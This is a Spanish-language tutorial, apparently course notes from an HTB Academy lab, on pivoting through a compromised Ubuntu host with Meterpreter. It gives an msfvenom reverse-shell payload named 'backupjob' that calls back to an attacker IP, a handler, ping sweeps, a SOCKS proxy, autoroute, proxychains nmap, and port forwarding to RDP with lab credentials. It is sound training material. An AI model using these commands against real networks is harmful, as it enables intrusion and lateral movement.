Ahora consideremos un escenario donde tenemos acceso a una shell Meterpreter en el servidor Ubuntu (el host pivote), y queremos realizar escaneos de enumeración a través de ese host pivote, pero nos gustaría aprovechar las facilidades que ofrecen las sesiones Meterpreter. En estos casos, todavía podemos crear un pivot con nuestra sesión Meterpreter sin depender del reenvío de puertos SSH. Podemos crear una shell Meterpreter para el servidor Ubuntu con el siguiente comando, que nos devolverá una shell en nuestro equipo atacante en el puerto 8080.

##### Creando un payload para el host pivote Ubuntu

```shell-session
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

Antes de copiar el payload, empezamos un multi/handler, también conocido como Payload Handler genérico

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080 
```

Copiamos con `scp` el binario al host pivote Ubuntu y lo ejecutamos para obtener una sesión Meterpreter. En el caso de este módulo, la contraseña es `HTB_@cademy_stdnt!`. Sabemos que el objetivo Windows se encuentra en la red 172.16.5.0/23. Por lo tanto, asumiendo que el firewall del objetivo Windows permite las solicitudes ICMP, querríamos realizar un barrido de ping en esta red. Podemos hacerlo utilizando Meterpreter con el módulo `ping_sweep`, que generará el tráfico ICMP desde el host Ubuntu hacia la red 172.16.5.0/23.

##### Ping sweep

```shell-session
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23
[+] 	172.16.5.19 host found
[+] 	172.16.5.129 host found
meterpreter > background
```

También podríamos crear un bucle for directamente en un host pivote ovjetivo que hará un ping en el rango que especifiquemos:

**En Linux**

```shell-session
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

**En CMD**

```cmd-session
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

**En powershell**

```powershell-session
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

> ***Nota**: Es posible que un barrido de ping no obtenga respuestas exitosas en el primer intento, especialmente cuando se comunica a través de redes distintas. Esto puede deberse al tiempo que tarda un host en construir su caché ARP. En estos casos, es recomendable realizar el barrido de ping al menos dos veces para asegurar que la caché ARP se haya creado.

También pueden darse escenarios en los que el firewall de un host bloquee el ping (ICMP), y por tanto no obtengamos respuestas exitosas. En tales casos, podemos realizar un escaneo TCP en la red 172.16.5.0/23 utilizando Nmap. En lugar de usar SSH para el reenvío de puertos, también podemos emplear el módulo de post-explotación de Metasploit `socks_proxy` para configurar un proxy local en nuestro equipo atacante. Configuraremos el proxy SOCKS para la versión 4a. Esta configuración iniciará un listener en el puerto 9050 y enrutarán todo el tráfico recibido a través de nuestra sesión Meterpreter.

##### Configurando el proxy SOCKS de MSF

```shell-session
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                        5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```

Confirmamos que está activo

```
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  4   Auxiliary: server/socks_proxy
```

Después de iniciar el servidor SOCKS, configuraremos proxychains para enrutar el tráfico generado por otras herramientas, como Nmap, a través de nuestro pivot en el host Ubuntu comprometido. Podemos añadir la siguiente línea al final del archivo `proxychains.conf`, ubicado en `/etc/proxychains.conf`, si aún no está presente. Por último, necesitamos indicarle al módulo `socks_proxy` que enrute todo el tráfico a través de nuestra sesión Meterpreter. Para ello, podemos utilizar el módulo `post/multi/manage/autoroute` de Metasploit para añadir rutas para la subred 172.16.5.0 y, a continuación, enrutar todo nuestro tráfico generado mediante proxychains.

```shell-session
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```

> *Nota: para saber a qué sesión apuntar, usar el comando `sessions`. Previamente tenemos que haber puesto `background` en una sesión activa de Meterpreter

También es posible añadir rutas con autoroute si ejecutamos autoroute desde la sesión Meterpreter. Para volver a la sesión previa de Meterpreter, usar `sessions -i <num>`

```shell-session
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes
```

##### Listando rutas activas con AutoRoute

```
meterpreter > run autoroute -p
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 2
   172.16.4.0         255.255.254.0      Session 2
   172.16.5.0         255.255.254.0      Session 2
```

Como se puede observar en la salida anterior, la ruta se ha añadido a la red 172.16.5.0/23. Ahora podremos utilizar proxychains para enrutar nuestro tráfico de Nmap a través de nuestra sesión Meterpreter.

##### Probando la funcionalidad de Proxy y Routing

```bash
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

### Port Forwarding

El reenvío de puertos también puede realizarse utilizando el módulo `portfwd` de Meterpreter. Podemos habilitar un listener en nuestro equipo atacante y solicitar a Meterpreter que reenvíe todos los paquetes recibidos en ese puerto, a través de nuestra sesión Meterpreter, hacia un host remoto en la red 172.16.5.0/23.

```shell-session
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```

El comando anterior solicita a la sesión Meterpreter que inicie un listener en el puerto local (`-l`) 3300 de nuestro equipo atacante y que reenvíe todos los paquetes recibidos a través de la sesión Meterpreter hacia el servidor Windows remoto 172.16.5.19 en el puerto 3389 (`-p`). Ahora, si ejecutamos `xfreerdp` sobre `localhost:3300`, podremos establecer una sesión de escritorio remoto.

##### Conectando a Windows a través de localhost con xfreerdp

```bash
xfreerdp3 /v:localhost:3300 /u:victor /p:pass@123
```

### Reenvío de puertos inverso con Meterpreter

De forma similar al reenvío de puertos local, Metasploit también permite realizar reenvíos de puertos inversos con el siguiente comando. Esto resulta útil cuando se desea escuchar en un puerto específico en el servidor comprometido y reenviar todas las conexiones entrantes desde el servidor Ubuntu hacia nuestro equipo atacante. Iniciaremos un listener en un nuevo puerto de nuestro equipo atacante destinado a Windows, y solicitaremos al servidor Ubuntu que reenvíe todas las peticiones que reciba en su puerto 1234 hacia nuestro listener en el puerto 8081.

Podemos crear este reenvío de puertos inverso sobre la shell existente del escenario anterior con el siguiente comando. Este comando reenvía todas las conexiones al puerto 1234 del servidor Ubuntu hacia nuestro equipo atacante, en el puerto local (`-l`) 8081. También configuraremos nuestro listener para que escuche en el puerto 8081 una shell de Windows.

##### Reglas de reenvío inverso de puertos

```shell-session
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```



